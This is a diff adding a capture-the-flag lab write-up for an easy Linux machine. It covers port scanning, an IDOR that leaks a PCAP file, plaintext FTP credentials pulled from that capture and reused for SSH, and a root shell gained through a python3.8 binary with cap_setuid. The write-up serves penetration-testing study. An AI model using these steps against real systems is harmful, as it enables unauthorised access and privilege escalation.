@@ -1,0 +1,77 @@
+**Difficulty:** Easy
+**OS:** Linux
+**Date:** 14.10.2026
+
+---
+
+## 1. Reconnaissance
+
+Nmap scan:
+nmap -sV -sC -p- <IP>
+Open ports:
+
+21 (FTP) — vsftpd 3.0.3
+
+22 (SSH) — OpenSSH 8.2
+
+80 (HTTP) — Gunicorn
+
+2. Enumeration
+Web server on port 80 shows a "Security Dashboard".
+
+The dashboard has a functionality to download network captures (PCAP files).
+
+By inspecting the URL, we see:
+
+http://<IP>/data/1
+We can change the ID (IDOR):
+
+http://<IP>/data/0
+This allows us to download a PCAP file that we don't have access to.
+
+3. Exploitation
+Download the PCAP file:
+
+wget http://<IP>/data/0 -O capture.pcap
+Open it in Wireshark:
+
+wireshark capture.pcap
+Follow the FTP stream (right-click → Follow → TCP Stream).
+
+We find credentials:
+
+USER nathan
+PASS Buck3tH4TF0RM3!
+Use these credentials to log in via SSH:
+
+ssh nathan@<IP>
+# Password: Buck3tH4TF0RM3!
+4. Privilege Escalation
+Check Linux capabilities:
+
+getcap -r / 2>/dev/null
+Output:
+
+/usr/bin/python3.8 = cap_setuid+ep
+This means python3.8 can set its UID to any value (including 0 = root).
+
+Exploit:
+
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+Now we have a root shell.
+
+5. Flags
+User flag: cat /home/nathan/user.txt
+
+Root flag: cat /root/root.txt
+
+6. Lessons Learned
+IDOR in the URL (changing ID gives access to other users' data).
+
+PCAP analysis reveals credentials in plaintext (FTP is unencrypted).
+
+Linux Capabilities is a privilege escalation vector.
+
+Always check getcap -r / 2>/dev/null after getting initial access.
+
+GTFOBins has a section for capabilities exploitation.
